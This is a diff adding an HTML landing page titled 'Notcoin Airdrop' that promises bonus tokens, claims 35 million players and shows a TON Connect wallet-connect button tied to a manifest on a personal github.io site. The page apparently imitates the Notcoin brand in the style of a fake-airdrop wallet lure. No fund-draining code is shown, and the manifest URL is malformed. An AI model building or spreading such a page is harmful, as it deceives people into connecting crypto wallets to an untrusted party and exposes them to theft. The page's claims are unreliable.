@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Notcoin Airdrop</title>
+    <link rel="stylesheet" href="styles.css">
+    <script src="https://unpkg.com/@tonconnect/ui@0.0.9/dist/tonconnect-ui.min.js"></script>
+</head>
+<body>
+    <div class="container">
+        <div class="image">
+            <img src="coin-image.png" alt="Coin Image">
+        </div>
+        <div class="title">Notcoin Airdrop</div>
+        <div class="subtitle">the biggest community eeevver</div>
+        <div class="bonus">🔥 bonus tokens for holders</div>
+        <div class="players">35,197,397 total players</div>
+        <div id="connect" style = "position: absolute; top: 61%; right: 46%"></div>
+        <script>
+            const toconnection = new TON_CONNECT_UI.TonConnectUI({
+            manifestUrl: 'https://<https://zimrem.github.io/main/tonconnect-manifest.json',
+            buttonRootId: 'connect'
+            });
+        </script>
+    </div>
+</body>
+</html>
